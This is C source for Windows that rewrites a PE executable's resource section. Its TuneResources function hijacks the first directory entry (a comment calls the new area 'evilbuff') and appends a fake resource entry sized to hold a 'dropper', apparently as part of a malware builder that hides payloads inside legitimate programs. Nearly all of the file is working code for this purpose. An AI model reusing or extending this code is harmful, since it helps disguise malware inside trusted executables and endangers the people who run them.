#include <windows.h>
#include <stdio.h>


VOID ParseResources(PIMAGE_RESOURCE_DIRECTORY pRootDirectory, PIMAGE_RESOURCE_DIRECTORY pResourceDirectory, ULONG uLevel)
{
	PIMAGE_RESOURCE_DATA_ENTRY pEntryData;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pDirectoryEntry;
	pDirectoryEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY) (pResourceDirectory + 1);
	
	if (uLevel > 2)
		return;

	printf("\n[%d] Directory @ %08x, Entry @ %08x, Items: %d\n", uLevel,
		((PBYTE)pResourceDirectory - (PBYTE)pRootDirectory), 
		((PBYTE)pDirectoryEntry - (PBYTE)pRootDirectory),
		pResourceDirectory->NumberOfIdEntries + pResourceDirectory->NumberOfNamedEntries);

	for (DWORD i=0; i < pResourceDirectory->NumberOfIdEntries + pResourceDirectory->NumberOfNamedEntries; i++)
	{
		printf("   Entry %d @ %08x\n", i, ((PBYTE)&pDirectoryEntry[i] - (PBYTE)pRootDirectory));
		if (pDirectoryEntry[i].DataIsDirectory)
		{
			uLevel++;
			if (!pDirectoryEntry->NameIsString)
				printf("    - OffsetToDirectory: %08x, Id: %d\n", pDirectoryEntry[i].OffsetToDirectory, pDirectoryEntry[i].Id);
			else
				printf("    - OffsetToDirectory: %08x, Name: %s\n", pDirectoryEntry[i].OffsetToDirectory, "NAME_NAME");
			ParseResources(pRootDirectory, (PIMAGE_RESOURCE_DIRECTORY) (((PBYTE)pRootDirectory) + pDirectoryEntry[i].OffsetToDirectory), uLevel);
		}
		else
		{
			pEntryData = (PIMAGE_RESOURCE_DATA_ENTRY) (((PBYTE)pRootDirectory) + pDirectoryEntry[i].OffsetToData);

			if (!pDirectoryEntry->NameIsString)
				printf("    - OffsetToData: %08x, size: %d, Id: %d\n", pDirectoryEntry[i].OffsetToData, pEntryData->Size, pDirectoryEntry[i].Id);
			else
				printf("    - OffsetToData: %08x, size: %d, Name: %s\n", pDirectoryEntry[i].OffsetToData, pEntryData->Size, "NAME_NAME");
		}
	}
	printf("###### ENDOF %08x\n", ((PBYTE)pResourceDirectory - (PBYTE)pRootDirectory));
}

VOID DebugRsrc(PBYTE pBuffer)
{
	ParseResources((PIMAGE_RESOURCE_DIRECTORY) pBuffer,
		(PIMAGE_RESOURCE_DIRECTORY) pBuffer,
		0); 
}



PBYTE TuneResources(PBYTE pRsrcBuffer, ULONG uSectionSize, ULONG uDropperSize, PULONG uNewSectionSize)
{
	printf("##################### BEFORE ##################\n");
	DebugRsrc(pRsrcBuffer);


	/* save first directory before root */
	PIMAGE_RESOURCE_DIRECTORY pOriginalRootDir = (PIMAGE_RESOURCE_DIRECTORY)pRsrcBuffer;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pOriginalFirstEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY) (pOriginalRootDir + 1);
	/* and first table */
	PIMAGE_RESOURCE_DIRECTORY pOriginalFirstTable = (PIMAGE_RESOURCE_DIRECTORY) (pRsrcBuffer + pOriginalFirstEntry->OffsetToDirectory);


	ULONG uDirSize = sizeof(IMAGE_RESOURCE_DIRECTORY) + 
		(sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * (pOriginalFirstTable->NumberOfIdEntries + pOriginalFirstTable->NumberOfNamedEntries));


	/* new size */
	*uNewSectionSize = uSectionSize + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) + sizeof(IMAGE_RESOURCE_DATA_ENTRY);
	while(*uNewSectionSize % 0x1000) // FIXME SectionAlignment
		(*uNewSectionSize) += 1;

	/* copy original data */
	PBYTE pOutputBuffer = (PBYTE) malloc(*uNewSectionSize);
	PBYTE pBuffer = pOutputBuffer;
	memcpy(pOutputBuffer, pRsrcBuffer, uSectionSize);

	/* modify first directory entry offset to point to beyond original .rsrc (evilbuff) */
	PIMAGE_RESOURCE_DIRECTORY pHijackedRootDir = (PIMAGE_RESOURCE_DIRECTORY) (pOutputBuffer);
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pHijackedFirstEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY) (pHijackedRootDir + 1);
	pHijackedFirstEntry->OffsetToDirectory = uSectionSize;


	/* advance buffer */
	pOutputBuffer += uSectionSize;

	/* copy first directory + entries  and increment element id */
	memcpy(pOutputBuffer, pOriginalFirstTable, uDirSize);


	/* add an entry to the hihacked table */
	PIMAGE_RESOURCE_DIRECTORY pHijackedFirstTable = (PIMAGE_RESOURCE_DIRECTORY)pOutputBuffer;
	pHijackedFirstTable->NumberOfIdEntries += 1;


	pOutputBuffer += uDirSize;


	/* fake entry */

	for (ULONG i=0; i < sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY); i++)
		pOutputBuffer[i] = 0x0;

	PIMAGE_RESOURCE_DIRECTORY_ENTRY pFakeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)pOutputBuffer;
	pFakeEntry->DataIsDirectory = 0;
	pFakeEntry->NameIsString = 0;
	pFakeEntry->Id = 10;
	pFakeEntry->OffsetToData = uSectionSize + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);


	pOutputBuffer += sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);


	/* fake data entry */
	memset(pOutputBuffer, 0x0, sizeof(IMAGE_RESOURCE_DATA_ENTRY));
	PIMAGE_RESOURCE_DATA_ENTRY pFakeDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)pOutputBuffer;

	pFakeDataEntry->Size = uDropperSize; // - (uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)); // FIXME: DropperSize
	pFakeDataEntry->OffsetToData = uSectionSize + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) + sizeof(IMAGE_RESOURCE_DATA_ENTRY);

	pOutputBuffer += sizeof(IMAGE_RESOURCE_DATA_ENTRY);

	printf("##################### AFTER ##################\n");
	DebugRsrc(pBuffer);


	return pBuffer;	
}



